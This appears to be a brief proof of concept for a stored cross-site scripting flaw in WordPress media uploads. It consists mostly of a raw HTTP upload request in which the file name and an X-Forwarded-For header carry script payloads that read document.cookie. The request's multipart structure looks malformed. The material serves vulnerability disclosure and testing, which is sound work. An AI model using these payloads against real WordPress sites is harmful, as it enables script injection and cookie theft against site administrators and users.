When an image with a file name such as cengizhansahinsumofpwn<img src=a onerror=alert(document.cookie)>.jpg is uploaded and viewed within WordPress the script code is executed:

Request to http://192.168.28.147:80

POST /wp-admin/media-new.php HTTP/1.1
Host: 192.168.28.147
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: application/xml, application/xhtml+xml, text/html;q=0.9, */*;q=0.8
Accept-Encoding: gzip, deflate
Referer: http://192.168.28.147/wp-admin/media-new.php
Cookie: wp-saving-post=1-saved; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in=...; 
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----52970035813542000911009238531
Content-Length: 430862
X-Forwarded-For: <img src="x" onerror=prompt(document.cookie)>, <img src="x" onerror=prompt(document.cookie)>, <img src="x" onerror=prompt(document.cookie)>
Content-Disposition: form-data; name="async-upload"; filename="cengizhansahinuomofync<img src=x onerror=alert(document.cookie)>.jpg"
Content-Type: image/jpeg

------52970035813542000911009238531
Content-Disposition: form-data; name="async-upload"; filename="cengizhansahinuomofync<img src=x onerror=alert(document.cookie)>.jpg"
Content-Type: image/jpeg

